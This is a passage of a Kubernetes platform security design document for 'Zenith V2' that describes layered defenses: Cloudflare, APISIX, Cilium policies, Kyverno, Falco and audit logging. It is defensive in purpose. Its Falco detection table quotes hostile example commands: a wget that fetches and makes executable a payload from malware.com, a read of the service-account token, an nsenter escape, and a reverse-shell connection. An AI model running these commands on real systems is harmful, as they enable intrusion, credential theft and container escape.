# Zenith V2 — Defense-in-Depth Security Model

> **Status:** Design Complete, Implementation Pending
> **Last Updated:** 2026-02-25
> **Author:** Babak + Claude (Platform Architecture Session)

---

## Table of Contents

1. [Security Philosophy](#security-philosophy)
2. [Layer 0: Cloudflare (Edge Protection)](#layer-0-cloudflare-edge-protection)
3. [Layer 1: APISIX (API Gateway)](#layer-1-apisix-api-gateway)
4. [Layer 2: Cilium (Network Security)](#layer-2-cilium-network-security)
5. [Layer 3: Pod Security Standards + Kyverno](#layer-3-pod-security-standards--kyverno)
6. [Layer 4: Falco (Runtime Security)](#layer-4-falco-runtime-security)
7. [Layer 5: Audit Logging](#layer-5-audit-logging)
8. [Layer 6: Image Supply Chain](#layer-6-image-supply-chain)
9. [Secrets Management](#secrets-management)
10. [Per-Customer Isolation](#per-customer-isolation)
11. [Resource Control](#resource-control)
12. [Identity & Authentication](#identity--authentication)
13. [Security Model Diagram](#security-model-diagram)

---

## Security Philosophy

Zenith V2 follows a **defense-in-depth** strategy: no single layer is trusted to stop all attacks. If an attacker bypasses one layer, the next layer catches them. Every layer operates independently — even if Cloudflare goes down, Cilium still enforces network policy. Even if APISIX has a bug, Pod Security Standards still prevent container escape.

```
                         Internet
                            |
               =============+============= Layer 0: Cloudflare
               DDoS mitigation, WAF, CDN, edge rate-limit
                            |
               =============+============= Layer 1: APISIX
               JWT verification, CORS, API rate-limit
                            |
               =============+============= Layer 2: Cilium
               Network policy, WireGuard encryption, L7 HTTP filter
                            |
               =============+============= Layer 3: Pod Security + Kyverno
               Container hardening, image policy, resource enforcement
                            |
               =============+============= Layer 4: Falco
               Runtime anomaly detection (shells, crypto miners, sensitive reads)
                            |
               =============+============= Layer 5: Audit Logging
               K8s API audit -> Loki -> Grafana (who did what, when)
                            |
               =============+============= Layer 6: Image Supply Chain
               Harbor Trivy scan, cosign signing, SBOM, Renovate
                            |
                     [ Application ]
```

The principle is simple: **assume every layer will fail, and design the next layer to catch it.**

---

## Layer 0: Cloudflare (Edge Protection)

### What it does

Cloudflare sits between the internet and our Hetzner servers. All traffic flows through Cloudflare before it reaches our cluster. This gives us:

| Capability | Why it matters |
|-----------|---------------|
| **DDoS mitigation** | Absorbs volumetric attacks (L3/L4/L7) before they reach Hetzner. A single Hetzner node cannot survive a DDoS attack on its own. |
| **Web Application Firewall (WAF)** | Blocks common attack patterns (SQLi, XSS, path traversal) at the edge. Reduces load on APISIX and backend. |
| **CDN** | Caches static assets (JS, CSS, images) at 300+ edge locations. Customers get faster frontends without our servers doing any work. |
| **Edge rate-limiting** | Stops brute-force and credential-stuffing attacks before they reach our infrastructure. Configurable per-zone rules. |
| **Bot management** | Detects and challenges automated traffic. Protects signup endpoints from bot floods. |

### Why DNS-01 instead of HTTP-01

In V1, we used HTTP-01 challenges for Let's Encrypt. This required **Cloudflare proxy to be OFF** (DNS only) because HTTP-01 works by placing a token at `http://<domain>/.well-known/acme-challenge/<token>`, and Cloudflare's proxy intercepts this path.

The problem: with proxy OFF, traffic goes directly to our Hetzner IP. No DDoS protection, no WAF, no CDN. We lose everything Cloudflare offers.

In V2, we switch to **DNS-01 challenges**:

```
HTTP-01 (V1 — BAD):
  Let's Encrypt -> http://example.com/.well-known/acme-challenge/TOKEN
                   |
                   v
  Cloudflare proxy intercepts -> FAILS (proxy rewrites/caches the path)
  Solution: turn proxy OFF -> lose ALL Cloudflare protection

DNS-01 (V2 — GOOD):
  Let's Encrypt -> check TXT record: _acme-challenge.example.com
                   |
                   v
  cert-manager -> Cloudflare API -> creates TXT record
  Let's Encrypt validates TXT record -> issues certificate
  Cloudflare proxy stays ON -> we keep ALL protection
```

**How cert-manager does DNS-01:**

```yaml
apiVersion: cert-manager.io/v1
kind: ClusterIssuer
metadata:
  name: letsencrypt-prod
spec:
  acme:
    server: https://acme-v02.api.letsencrypt.org/directory
    email: platform@freezenith.com
    privateKeySecretRef:
      name: letsencrypt-prod-key
    solvers:
      - dns01:
          cloudflare:
            apiTokenSecretRef:
              name: cloudflare-api-token
              key: api-token
```

cert-manager uses a Cloudflare API token (with Zone:DNS:Edit permission) to create and delete TXT records automatically. The API token is stored as a Sealed Secret in Git.

### Cloudflare configuration

```
Zone: freezenith.com
  SSL/TLS: Full (Strict)     -- Cloudflare <-> origin is encrypted with valid cert
  Always Use HTTPS: ON       -- Force all HTTP to HTTPS
  Minimum TLS: 1.2
  Automatic HTTPS Rewrites: ON
  HSTS: max-age=31536000, includeSubDomains

  WAF Managed Rules: ON (OWASP Core Rule Set)
  Rate Limiting Rules:
    - /api/v1/auth/*:  20 requests/minute per IP (login/register)
    - /api/v1/*:       600 requests/minute per IP (general API)
    - /*:              1200 requests/minute per IP (everything else)

  Bot Fight Mode: ON
  Challenge Passage: 30 minutes
```

For customer custom domains (Pro+), we create individual Cloudflare zones or use Cloudflare for SaaS (SSL for SaaS). The customer points a CNAME to `proxy.freezenith.com`, and Cloudflare handles the rest.

---

## Layer 1: APISIX (API Gateway)

### What it does

APISIX is the API gateway for all backend requests. It sits between Traefik (TLS termination) and the backend pods. APISIX handles:

| Capability | Why it matters |
|-----------|---------------|
| **JWT verification** | Validates every API request against Keycloak's JWKS endpoint. Backends never see unauthenticated requests. |
| **Per-customer CORS** | Each customer gets CORS configured for their specific domain(s). No wildcard `*` origins. |
| **API rate-limiting** | Per-customer, per-tier rate limits. Free: 100 req/min. Pro: 1000 req/min. Prevents one customer from starving others. |
| **Request logging** | Structured access logs for every API call. Who, when, what endpoint, response code, latency. |
| **OpenTelemetry** | Auto-injects trace IDs into every request for distributed tracing. |

### Two IngressClasses: Why and How

We run two IngressClasses in the cluster:

```
IngressClass: traefik (default)
  Purpose: Frontend routing (static pages, Next.js apps)
  Who handles it: Traefik (built into k3s)
  Authentication: None (frontends are public HTML)
  Examples:
    - freezenith.com -> zenith-landing
    - <customer>.freezenith.com -> customer-frontend
    - admin.freezenith.com -> zenith-admin

IngressClass: apisix
  Purpose: Protected backend APIs
  Who handles it: APISIX
  Authentication: JWT via Keycloak
  Examples:
    - api.<customer>.freezenith.com/v1/* -> customer-backend

APISIX public routes (no auth, same gateway, route-level config):
  Purpose: Public backend endpoints (webhooks, unsubscribe)
  Who handles it: Same APISIX instance, but these routes have no jwt-auth plugin
  Authentication: None
  Examples:
    - api.<customer>.freezenith.com/v1/webhooks/* -> customer-backend
    - api.<customer>.freezenith.com/v1/unsubscribe/* -> customer-backend
```

**Why not route everything through APISIX?**

Frontends serve HTML/JS. There is no JWT to verify. Running them through APISIX adds latency with zero security benefit. Traefik routes them directly.

Backend APIs carry sensitive data. They MUST be authenticated. APISIX sits in front and verifies every request before it reaches the backend.

Some backend endpoints (webhooks from Stripe, unsubscribe links in emails) legitimately have no JWT. These are configured as public routes on the same APISIX instance — the route simply has no jwt-auth plugin attached. They still get CORS and rate-limiting.

### APISIX JWKS Verification Flow

```
                 Customer Frontend
                        |
                  Authorization: Bearer <JWT>
                        |
                        v
                   +---------+
                   | Traefik |   TLS termination only
                   +---------+
                        |
                  (IngressClass: apisix)
                        |
                        v
               +-----------------+
               |     APISIX      |
               |                 |
               |  1. Extract JWT from Authorization header
               |  2. Decode JWT header -> get "kid" (key ID)
               |  3. Fetch JWKS from Keycloak:
               |     GET https://auth.freezenith.com/realms/<customer>/
               |         protocol/openid-connect/certs
               |     (cached for 5 min, refreshed on unknown kid)
               |  4. Find matching public key by kid
               |  5. Verify signature (RS256)
               |  6. Check exp (not expired)
               |  7. Check aud (matches customer client_id)
               |  8. Check iss (matches expected realm URL)
               |                 |
               |  IF VALID:      |  IF INVALID:
               |  Forward to     |  Return 401
               |  backend with   |  { "message": "Unauthorized" }
               |  headers:       |
               |  X-Consumer-ID  |
               |  X-Consumer-Realm
               |  X-Token-Sub    |
               +-----------------+
                        |
                        v
                  Backend Pod
                  (trusts X-Consumer-* headers)
```

The backend never validates JWTs itself. It trusts that if a request reached it, APISIX already verified it. This is safe because Cilium NetworkPolicy ensures the backend pod can ONLY receive traffic from APISIX (not from any other pod or the internet directly).

### APISIX Route Example

```yaml
apiVersion: apisix.apache.org/v2
kind: ApisixRoute
metadata:
  name: customer-abc-protected
  namespace: zenith-customer-abc
spec:
  http:
    - name: api-protected
      match:
        hosts:
          - api.abc.freezenith.com
        paths:
          - /v1/*
      backends:
        - serviceName: customer-abc-backend
          servicePort: 8080
      authentication:
        enable: true
        type: jwt-auth
        keyAuth:
          header: Authorization
      plugins:
        - name: cors
          enable: true
          config:
            allow_origins: "https://abc.freezenith.com"
            allow_methods: "GET,POST,PUT,DELETE,PATCH,OPTIONS"
            allow_headers: "Authorization,Content-Type"
            max_age: 3600
        - name: limit-req
          enable: true
          config:
            rate: 100        # Free tier: 100 req/sec burst
            burst: 50
            key_type: var
            key: remote_addr
            rejected_code: 429
```

---

## Layer 2: Cilium (Network Security)

### What it does

Cilium replaces Flannel (the default k3s CNI) and provides:

| Capability | Why it matters |
|-----------|---------------|
| **Default-deny NetworkPolicy** | Every customer namespace starts with "deny all ingress and egress." Nothing gets through unless explicitly allowed. |
| **Explicit allow rules** | We allow only: APISIX -> backend, backend -> CNPG, backend -> Hetzner S3, backend -> Keycloak. Nothing else. |
| **WireGuard encryption** | All pod-to-pod traffic is encrypted at the kernel level. Even if someone sniffs the network, they see ciphertext. |
| **L7 HTTP filtering** | Beyond IP/port rules, Cilium can filter on HTTP method, path, and headers. We can say "only allow GET /health from monitoring namespace." |
| **Hubble observability** | Network flow visibility. See which pod talks to which, DNS queries, dropped packets. Essential for debugging and security auditing. |

### Why not just Kubernetes NetworkPolicy?

Kubernetes NetworkPolicy (vanilla) is L3/L4 only — it can match on IP and port but cannot inspect HTTP requests. It also lacks:
- WireGuard encryption (pods communicate in cleartext by default)
- DNS-aware policies (you cannot say "allow egress to *.hetzner.com")
- Hubble metrics and flow logs
- Identity-based policies (Cilium uses pod labels, not IPs, which survive restarts)

Cilium provides all of this as a single CNI replacement.

### Default-Deny Strategy

Every customer namespace gets this CiliumNetworkPolicy applied during provisioning (Temporal Activity 4):

```yaml
# Default deny ALL traffic in customer namespace
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: default-deny-all
  namespace: zenith-customer-abc
spec:
  endpointSelector: {}    # Matches ALL pods in this namespace
  ingress:
    - {}                   # Deny all ingress (empty fromEndpoints)
  egress:
    - {}                   # Deny all egress (empty toEndpoints)
  ingressDeny:
    - fromEntities:
        - world
        - cluster
  egressDeny:
    - toEntities:
        - world
        - cluster
```

Wait — that denies everything, including legitimate traffic. That is the point. After this base policy, we layer on explicit allows:

### Example CiliumNetworkPolicy for a Customer Namespace

```yaml
# ============================================================
# File: cilium-policy-customer.yaml
# Applied to: zenith-customer-abc namespace
# Purpose: Allow only the traffic this customer actually needs
# ============================================================

---
# 1. DEFAULT DENY: Block everything first
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: default-deny
  namespace: zenith-customer-abc
spec:
  endpointSelector: {}
  ingress: []
  egress: []

---
# 2. ALLOW: Traefik -> customer frontend (port 3000)
#    Why: Traefik needs to route HTTP requests to the frontend pod
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-traefik-to-frontend
  namespace: zenith-customer-abc
spec:
  endpointSelector:
    matchLabels:
      app: customer-frontend
  ingress:
    - fromEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: kube-system
            app.kubernetes.io/name: traefik
      toPorts:
        - ports:
            - port: "3000"
              protocol: TCP

---
# 3. ALLOW: APISIX -> customer backend (port 8080)
#    Why: APISIX forwards authenticated API requests to the backend
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-apisix-to-backend
  namespace: zenith-customer-abc
spec:
  endpointSelector:
    matchLabels:
      app: customer-backend
  ingress:
    - fromEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: apisix
            app.kubernetes.io/name: apisix
      toPorts:
        - ports:
            - port: "8080"
              protocol: TCP

---
# 4. ALLOW: Customer backend -> PostgreSQL (port 5432)
#    Why: Backend needs to read/write its database
#    Note: FQDN is the CNPG service in zenith-shared namespace
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-backend-to-postgres
  namespace: zenith-customer-abc
spec:
  endpointSelector:
    matchLabels:
      app: customer-backend
  egress:
    - toEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: zenith-shared
            cnpg.io/cluster: free-pg
      toPorts:
        - ports:
            - port: "5432"
              protocol: TCP

---
# 5. ALLOW: Customer backend -> Hetzner S3 (HTTPS, port 443)
#    Why: Backend stores files in the customer's S3 bucket
#    Note: Using FQDN-based policy since S3 is external
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-backend-to-s3
  namespace: zenith-customer-abc
spec:
  endpointSelector:
    matchLabels:
      app: customer-backend
  egress:
    - toFQDNs:
        - matchPattern: "*.your-objectstorage.com"
      toPorts:
        - ports:
            - port: "443"
              protocol: TCP

---
# 6. ALLOW: Customer backend -> Keycloak (HTTPS, port 443)
#    Why: Backend may call Keycloak Admin API (user management)
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-backend-to-keycloak
  namespace: zenith-customer-abc
spec:
  endpointSelector:
    matchLabels:
      app: customer-backend
  egress:
    - toEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: keycloak
            app.kubernetes.io/name: keycloak
      toPorts:
        - ports:
            - port: "8443"
              protocol: TCP

---
# 7. ALLOW: All pods -> kube-dns (UDP 53, TCP 53)
#    Why: Without DNS, nothing works. Pods cannot resolve service names.
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-dns
  namespace: zenith-customer-abc
spec:
  endpointSelector: {}
  egress:
    - toEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: kube-system
            k8s-app: kube-dns
      toPorts:
        - ports:
            - port: "53"
              protocol: UDP
            - port: "53"
              protocol: TCP

---
# 8. ALLOW: Prometheus -> all pods (metrics scraping)
#    Why: Prometheus needs to scrape /metrics from pods for monitoring
apiVersion: cilium.io/v2
kind: CiliumNetworkPolicy
metadata:
  name: allow-prometheus-scrape
  namespace: zenith-customer-abc
spec:
  endpointSelector: {}
  ingress:
    - fromEndpoints:
        - matchLabels:
            k8s:io.kubernetes.pod.namespace: monitoring
            app.kubernetes.io/name: prometheus
      toPorts:
        - ports:
            - port: "9090"
              protocol: TCP
          rules:
            http:
              - method: GET
                path: /metrics
```

### L7 HTTP Filtering

Notice policy #8 above: we do not just allow Prometheus to connect on port 9090 — we restrict it to `GET /metrics` only. Even if Prometheus were compromised, it could not `POST /admin/delete` to a customer pod. This is L7 filtering, and it is unique to Cilium.

### WireGuard Encryption

Cilium's WireGuard mode encrypts all pod-to-pod traffic transparently:

```
Without WireGuard:
  Pod A --[cleartext TCP]--> Pod B
  An attacker sniffing the node network sees all data

With WireGuard:
  Pod A --[WireGuard tunnel (encrypted)]--> Pod B
  An attacker sniffing the node network sees only ciphertext
  Keys are rotated automatically by Cilium
```

Enabled via Helm values:

```yaml
cilium:
  encryption:
    enabled: true
    type: wireguard
    nodeEncryption: true   # Also encrypt node-to-node (not just pod-to-pod)
```

This is critical for multi-tenant security. Customer A's database queries should not be visible to Customer B, even if they share the same physical node.

---

## Layer 3: Pod Security Standards + Kyverno

### Pod Security Standards (PSS)

Kubernetes Pod Security Standards define three profiles:

| Profile | What it allows | Where we use it |
|---------|---------------|-----------------|
| **Privileged** | Everything (root, host network, host PID) | Never (only for CNI install in kube-system) |
| **Baseline** | Some capabilities, non-root preferred | `zenith-platform`, `monitoring`, `apisix` |
| **Restricted** | No root, no capabilities, read-only root FS, seccomp | ALL customer namespaces |

We enforce PSS via namespace labels:

```yaml
apiVersion: v1
kind: Namespace
metadata:
  name: zenith-customer-abc
  labels:
    # Enforce restricted mode: pods that violate are REJECTED
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/enforce-version: latest
    # Warn on violations (shows warning but allows pod — useful for debugging)
    pod-security.kubernetes.io/warn: restricted
    pod-security.kubernetes.io/warn-version: latest
    # Audit log violations
    pod-security.kubernetes.io/audit: restricted
    pod-security.kubernetes.io/audit-version: latest
```

Under `restricted`, customer pods CANNOT:
- Run as root (UID 0)
- Use `hostNetwork`, `hostPID`, `hostIPC`
- Mount `hostPath` volumes
- Use privileged containers
- Add Linux capabilities (no `NET_RAW`, no `SYS_ADMIN`)
- Run without a seccomp profile

This means even if a customer deploys a malicious container, it cannot escape the container sandbox.

### Kyverno Policies

Kyverno is a Kubernetes-native policy engine. It acts as an admission webhook: every resource creation/update passes through Kyverno before it is persisted to etcd. Kyverno can validate, mutate, or generate resources.

**Why Kyverno instead of OPA/Gatekeeper?** Kyverno policies are written in YAML (not Rego). They are easier to read, write, and debug. For our use case (multi-tenant enforcement), Kyverno covers everything we need.

#### Policy 1: Block Unsigned Images

```yaml
# Why: Prevent running images that were not signed by our CI pipeline.
# Without this, someone could push a malicious image to Harbor and deploy it.
# cosign signs every image after Trivy scan passes in CI.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: verify-image-signature
  annotations:
    policies.kyverno.io/title: Verify Image Signatures
    policies.kyverno.io/description: >-
      All container images must be signed with cosign.
      Unsigned images are rejected at admission time.
    policies.kyverno.io/severity: high
spec:
  validationFailureAction: Enforce   # Block (not just warn)
  background: false
  rules:
    - name: verify-cosign-signature
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - "zenith-*"          # All customer + platform namespaces
      verifyImages:
        - imageReferences:
            - "harbor.freezenith.com/*"
          attestors:
            - entries:
                - keys:
                    publicKeys: |-
                      -----BEGIN PUBLIC KEY-----
                      MFkwEwYHKoZIzj0CAQYIKoZIzj0DAQcDQgAE...
                      -----END PUBLIC KEY-----
          mutateDigest: true          # Rewrite tag to digest for immutability
          verifyDigest: true
```

#### Policy 2: Block Images Not From Harbor

> **Note:** `harbor.freezenith.com` in this policy refers to the **internal platform
> registry** (`registry.stage.freezenith.com` in staging). This is the registry that
> stores all platform images and is managed outside the cluster. The **customer Harbor**
> (`hub.stage.freezenith.com`) is a separate in-cluster instance for Pro-tier customers
> only. See `03-phase3-cluster-bootstrap.md` for the two-registry architecture.

```yaml
# Why: All images must come from our private Harbor registry.
# This prevents pulling unvetted images from Docker Hub or other registries.
# Harbor scans everything with Trivy before it is available.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: restrict-image-registry
  annotations:
    policies.kyverno.io/title: Restrict Image Registries
    policies.kyverno.io/description: >-
      Only images from our Harbor registry are allowed.
      This ensures all images have passed Trivy vulnerability scanning.
    policies.kyverno.io/severity: high
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: validate-image-registry
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - "zenith-*"
      validate:
        message: >-
          Images must be pulled from harbor.freezenith.com.
          Found image: {{request.object.spec.containers[].image}}.
          Push your image to Harbor first.
        pattern:
          spec:
            containers:
              - image: "harbor.freezenith.com/*"
            initContainers:
              - image: "harbor.freezenith.com/*"
            ephemeralContainers:
              - image: "harbor.freezenith.com/*"
```

#### Policy 3: Enforce Resource Limits

```yaml
# Why: Without resource limits, a single customer pod can consume all
# CPU/memory on a node, starving other customers (noisy neighbor problem).
# Every pod MUST declare requests AND limits.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-resource-limits
  annotations:
    policies.kyverno.io/title: Require Resource Limits
    policies.kyverno.io/description: >-
      All containers must specify CPU and memory requests and limits.
      This prevents resource starvation in a multi-tenant cluster.
    policies.kyverno.io/severity: medium
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: validate-resource-limits
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - "zenith-*"
      validate:
        message: >-
          All containers must have CPU and memory requests and limits.
          Container "{{request.object.spec.containers[].name}}" is missing them.
        pattern:
          spec:
            containers:
              - resources:
                  requests:
                    memory: "?*"
                    cpu: "?*"
                  limits:
                    memory: "?*"
                    cpu: "?*"
    - name: validate-init-container-limits
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - "zenith-*"
      preconditions:
        all:
          - key: "{{request.object.spec.initContainers[] | length(@)}}"
            operator: GreaterThan
            value: 0
      validate:
        message: >-
          Init containers must also have resource requests and limits.
        pattern:
          spec:
            initContainers:
              - resources:
                  requests:
                    memory: "?*"
                    cpu: "?*"
                  limits:
                    memory: "?*"
                    cpu: "?*"
```

#### Policy 4: Enforce Labels

```yaml
# Why: Labels are how we identify ownership, billing, and monitoring.
# Without them, we cannot track which customer owns a pod,
# which tier it belongs to, or query Prometheus by customer.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: require-labels
  annotations:
    policies.kyverno.io/title: Require Standard Labels
    policies.kyverno.io/description: >-
      All Deployments in customer namespaces must have standard labels
      for ownership tracking, billing, and observability.
    policies.kyverno.io/severity: medium
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: require-ownership-labels
      match:
        any:
          - resources:
              kinds:
                - Deployment
                - StatefulSet
                - DaemonSet
              namespaces:
                - "zenith-customer-*"
      validate:
        message: >-
          Resources in customer namespaces must have labels:
          zenith.io/customer, zenith.io/tier, zenith.io/component.
          Missing label on {{request.object.metadata.name}}.
        pattern:
          metadata:
            labels:
              zenith.io/customer: "?*"
              zenith.io/tier: "Free|Pro|Team|Enterprise"
              zenith.io/component: "?*"
          spec:
            template:
              metadata:
                labels:
                  zenith.io/customer: "?*"
                  zenith.io/tier: "Free|Pro|Team|Enterprise"
                  zenith.io/component: "?*"
```

#### Policy 5: Block NodePort Services

```yaml
# Why: NodePort services expose a port on every node in the cluster.
# In a multi-tenant environment, a customer should not be able to
# open arbitrary ports on shared infrastructure. All external access
# goes through Traefik/APISIX ingress.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-nodeport-services
  annotations:
    policies.kyverno.io/title: Block NodePort Services
    policies.kyverno.io/description: >-
      NodePort services are not allowed in customer namespaces.
      All external access must go through Traefik or APISIX ingress.
    policies.kyverno.io/severity: high
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: deny-nodeport
      match:
        any:
          - resources:
              kinds:
                - Service
              namespaces:
                - "zenith-customer-*"
      validate:
        message: >-
          NodePort services are not allowed. Use ClusterIP with an
          IngressRoute (Traefik) or ApisixRoute (APISIX) for external access.
        pattern:
          spec:
            type: "!NodePort"
```

#### Policy 6: Block hostPath Volumes

```yaml
# Why: hostPath volumes mount a directory from the host node into the pod.
# This is extremely dangerous in multi-tenant: a customer could read
# /etc/shadow, /var/lib/kubelet, or another customer's data on the
# same node. hostPath must be blocked completely in customer namespaces.
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-hostpath-volumes
  annotations:
    policies.kyverno.io/title: Block hostPath Volumes
    policies.kyverno.io/description: >-
      hostPath volumes are not allowed in customer namespaces.
      They would allow access to the host filesystem, breaking
      tenant isolation.
    policies.kyverno.io/severity: critical
spec:
  validationFailureAction: Enforce
  background: true
  rules:
    - name: deny-hostpath
      match:
        any:
          - resources:
              kinds:
                - Pod
              namespaces:
                - "zenith-customer-*"
      validate:
        message: >-
          hostPath volumes are not allowed. They expose the host
          filesystem and break tenant isolation. Use PersistentVolumeClaims
          with the Hetzner CSI driver instead.
        deny:
          conditions:
            any:
              - key: "{{ request.object.spec.volumes[?hostPath] | length(@) }}"
                operator: GreaterThan
                value: 0
```

---

## Layer 4: Falco (Runtime Security)

### What it does

Falco monitors container behavior at runtime using eBPF. While Layers 0-3 control what can be deployed and what traffic is allowed, Falco watches what is actually happening inside running containers.

Falco detects:

| Detection | Why it matters | Example |
|-----------|---------------|---------|
| **Shell spawned in container** | Containers should run their application, not interactive shells. A shell means either a breach or someone debugging in production (both bad). | `kubectl exec -it pod -- /bin/bash` |
| **Unexpected network connections** | A container suddenly connecting to an unknown IP may indicate a reverse shell or data exfiltration. | Pod connecting to `185.x.x.x:4444` |
| **Crypto miner processes** | Attackers often deploy crypto miners in compromised containers. Known process names and CPU patterns are detected. | `xmrig` or `minerd` process started |
| **Sensitive file reads** | Containers reading `/etc/shadow`, `/etc/passwd`, or Kubernetes service account tokens may indicate privilege escalation. | `cat /var/run/secrets/kubernetes.io/serviceaccount/token` |
| **Binary modification** | Containers should be immutable. Writing new executables to disk suggests malware installation. | `wget malware.com/payload -O /tmp/hack && chmod +x /tmp/hack` |
| **Unexpected privilege escalation** | Setuid calls, capability changes, or namespace escapes. | `nsenter --target 1 --mount --uts --ipc --net --pid` |

### How Falco works

```
+----------------------------------------------------------+
| Node                                                      |
|                                                           |
|  +--------+  +--------+  +--------+                      |
|  | Pod A  |  | Pod B  |  | Pod C  |  (customer containers)|
|  +--------+  +--------+  +--------+                      |
|       |           |           |                           |
|       v           v           v                           |
|  +------------------------------------------+            |
|  |          Linux Kernel (syscalls)          |            |
|  +------------------------------------------+            |
|       |                                                   |
|       v                                                   |
|  +------------------------------------------+            |
|  |    Falco eBPF probe (kernel module)       |            |
|  |    Captures: open, execve, connect,       |            |
|  |    socket, setuid, ptrace, etc.           |            |
|  +------------------------------------------+            |
|       |                                                   |
|       v                                                   |
|  +------------------------------------------+            |
|  |    Falco Rules Engine (userspace)         |            |
|  |    Evaluates each syscall against rules   |            |
|  |    Outputs: alert level, description,     |            |
|  |    container name, namespace, user        |            |
|  +------------------------------------------+            |
|       |                                                   |
|       v                                                   |
|  +------------------------------------------+            |
|  |    Outputs:                               |            |
|  |    - stdout (Promtail -> Loki)            |            |
|  |    - Falcosidekick -> Slack               |            |
|  |    - Falcosidekick -> Alertmanager        |            |
|  +------------------------------------------+            |
+----------------------------------------------------------+
```

### Example Falco rules (custom additions)

```yaml
# Detect shell in any customer namespace
- rule: Shell in Customer Container
  desc: >
    A shell (bash, sh, zsh) was spawned in a customer namespace.
    This should never happen in production.
  condition: >
    spawned_process and
    shell_procs and
    container and
    k8s.ns.name startswith "zenith-customer-"
  output: >
    Shell spawned in customer container
    (user=%user.name command=%proc.cmdline container=%container.name
     namespace=%k8s.ns.name pod=%k8s.pod.name image=%container.image.repository)
  priority: CRITICAL
  tags: [shell, customer, security]

# Detect outbound connections to non-allowed destinations
- rule: Unexpected Outbound Connection from Customer Pod
  desc: >
    A customer pod made an outbound connection to an IP that is not
    in our allowed list (CNPG, S3, Keycloak). This may indicate
    data exfiltration or a reverse shell.
  condition: >
    outbound and
    container and
    k8s.ns.name startswith "zenith-customer-" and
    not (fd.sip in (allowed_outbound_ips))
  output: >
    Unexpected outbound connection from customer pod
    (command=%proc.cmdline connection=%fd.name container=%container.name
     namespace=%k8s.ns.name pod=%k8s.pod.name)
  priority: WARNING
  tags: [network, customer, exfiltration]
```

### Falco response chain

```
Falco detects anomaly
  |
  v
Falcosidekick receives alert
  |
  +--> CRITICAL: page on-call via PagerDuty (shell in container, crypto miner)
  +--> WARNING:  notify Slack #security-alerts (unexpected network, sensitive read)
  +--> ALL:      log to Loki (searchable in Grafana)
  +--> CRITICAL: optionally auto-kill pod via K8s API (circuit-breaker, configurable)
```

---

## Layer 5: Audit Logging

### What it does

Kubernetes API audit logging records every request made to the K8s API server. This answers the question: **who did what, when, and from where?**

This is different from application logs (which record what your code does). Audit logs record what the Kubernetes control plane does: who created a pod, who read a secret, who deleted a namespace.

### Audit Policy Levels

Kubernetes supports four audit levels:

| Level | What is recorded | When to use |
|-------|-----------------|-------------|
| **None** | Nothing | Resources you do not care about (Events, ComponentStatus) |
| **Metadata** | Request metadata (user, verb, resource, timestamp) but NOT the request/response body | Most resources (Deployments, Services, ConfigMaps) |
| **Request** | Metadata + request body (what was sent) | Secret creation (to see who created what) |
| **RequestResponse** | Metadata + request body + response body | Highly sensitive operations (RBAC changes) |

### Our audit policy

```yaml
# /etc/kubernetes/audit-policy.yaml (on k3s server node)
apiVersion: audit.k8s.io/v1
kind: Policy
rules:
  # 1. Do not log events and health checks (too noisy)
  - level: None
    resources:
      - group: ""
        resources: ["events"]
      - group: ""
        resources: ["endpoints", "services"]
        verbs: ["get", "list", "watch"]
    users: ["system:kube-proxy", "system:apiserver"]

  # 2. Log Secret access at Request level (see who reads/creates secrets)
  - level: Request
    resources:
      - group: ""
        resources: ["secrets"]
    verbs: ["get", "list", "create", "update", "patch", "delete"]

  # 3. Log RBAC changes at RequestResponse level (full audit trail)
  - level: RequestResponse
    resources:
      - group: "rbac.authorization.k8s.io"
        resources: ["clusterroles", "clusterrolebindings", "roles", "rolebindings"]

  # 4. Log namespace lifecycle at Request level
  - level: Request
    resources:
      - group: ""
        resources: ["namespaces"]
    verbs: ["create", "delete", "update", "patch"]

  # 5. Log pod exec/attach at RequestResponse (someone is shelling into pods)
  - level: RequestResponse
    resources:
      - group: ""
        resources: ["pods/exec", "pods/attach", "pods/portforward"]

  # 6. Log CRD changes at Metadata level (Cilium policies, APISIX routes)
  - level: Metadata
    resources:
      - group: "cilium.io"
        resources: ["*"]
      - group: "apisix.apache.org"
        resources: ["*"]
      - group: "postgresql.cnpg.io"
        resources: ["*"]

  # 7. Default: Metadata for everything else
  - level: Metadata
    resources:
      - group: ""
      - group: "apps"
      - group: "batch"
```

### Pipeline: K8s Audit -> Loki -> Grafana

```
k3s API server
  |
  |-- writes audit log to: /var/log/kubernetes/audit.log
  |   (configured via --audit-log-path and --audit-policy-file)
  |
  v
Promtail (DaemonSet on every node)
  |
  |-- tails /var/log/kubernetes/audit.log
  |-- adds labels: job=kube-audit, namespace=<from event>, verb=<from event>
  |
  v
Loki (log aggregation)
  |
  |-- stores logs with configurable retention
  |-- staging: 7 days, production: 90 days
  |
  v
